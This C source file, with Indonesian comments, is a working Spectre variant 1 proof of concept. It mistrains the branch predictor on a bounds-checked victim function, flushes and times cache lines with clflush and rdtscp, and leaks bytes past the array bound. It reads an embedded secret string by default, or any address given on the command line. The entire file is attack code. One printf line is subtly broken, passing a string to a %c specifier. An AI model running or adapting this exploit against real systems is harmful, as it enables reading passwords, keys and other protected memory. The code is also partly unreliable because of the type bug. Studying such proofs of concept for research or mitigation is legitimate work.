#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* untuk rdtscp dan clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* untuk rdtscp dan clflush */
#endif

/********************************************************************
Kode Korban.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "Xnuvers007";

uint8_t temp = 0; /* Digunakan agar Kompiler tidak mengoptimalkan victim_function() */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}


/********************************************************************
Analisis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* mengasumsikan jumlah cache hit jika time <= threshold */

/* menebak dalam value[0] dab runner-up dalam value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--) {

        /* Flush array2[256*(0..255)] dari cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]); /* instruksi clflush */

        /* Perulangan 30: 5 kali jalan (x=training_x) per serangan mengeksekusi (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) {} /* Jeda (mfence) */

            /* Memutar untuk mengatur x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Menghindari training jika itu menju prediktor cabang (branch predictor) */
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Manggil Korban :V ! */
            victim_function(x);
        }

        /* Bagian membaca. Urutan sedikit tercampur demi menghindari prediksi langkah (stride prediction) */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk); /* READ TIMER */
            junk = *addr; /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit di tambahkan +1 untuk mencetak nilai ini */
        }

        /* Menemukan hasil penghitungan tertinggi dan tertinggi kedua dalam j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* sangat sukses jika if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* gunakan sampah sehingga kode diatas tidak dpat dioptimalkan...*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv) {
    size_t malicious_x=(size_t)(secret-(char*)array1); /* default untuk malicious_x */
    int i, score[2], len=40;
    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* menulis pada array2 jadi dalam ram tidak dapat mensalin diatas tulisan halaman yang kosong/nol */
    if (argc == 3) {
        sscanf(argv[1], "%p", (void**)(&malicious_x));
        malicious_x -= (size_t)array1; /* Konversi hasil input kedalam Pointer */
        sscanf(argv[2], "%d", &len);
    }

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void*)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
    }
    return (0);
}
